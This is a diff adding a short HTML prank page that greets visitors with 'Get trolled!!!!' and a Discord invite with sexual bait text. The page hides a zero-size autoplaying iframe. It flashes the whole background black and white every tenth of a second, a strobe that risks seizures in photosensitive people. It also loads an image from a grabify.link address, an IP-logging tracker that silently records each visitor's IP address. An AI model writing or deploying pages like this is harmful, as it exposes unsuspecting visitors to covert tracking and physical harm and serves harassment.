@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Page Title</title>
+<iframe width="0" height="0" src="https://www.youtuberepeater.com/watch?v=oavMtUWDBTM" frameborder="0" allowfullscreen></iframe>
+        <style>
+  @-webkit-keyframes argh-my-eyes {
+    0%   { background-color: #fff; }
+    49% { background-color: #fff; }
+    50% { background-color: #000; }
+    99% { background-color: #000; }
+    100% { background-color: #fff; }
+  }
+  @-moz-keyframes argh-my-eyes {
+    0%   { background-color: #fff; }
+    49% { background-color: #fff; }
+    50% { background-color: #000; }
+    99% { background-color: #000; }
+    100% { background-color: #fff; }
+  }
+  @keyframes argh-my-eyes {
+    0%   { background-color: #fff; }
+    49% { background-color: #fff; }
+    50% { background-color: #000; }
+    99% { background-color: #000; }
+    100% { background-color: #fff; }
+  }
+  body {
+  -webkit-animation: argh-my-eyes 0.1s infinite;
+  -moz-animation:    argh-my-eyes 0.1s infinite;
+  animation:         argh-my-eyes 0.1s infinite;
+}
+</style>
+<title>Page Title</title>
+</head>
+<body>
+<center><h1 style='font-size:40px'"'>Get trolled!!!!</h1>
+<p style=font-size:30px>trolled by pasha!</p>
+<a href="https://discord.gg/nhWVkhR" style=font-size:30px>https://discord.gg/nhWVkhR</a>
+<p style=font-size:30px>LOL! join sex world!<p>
+<img src="https://grabify.link/ERZJIE" width="150" height="150"> 
+</body>
+</html>
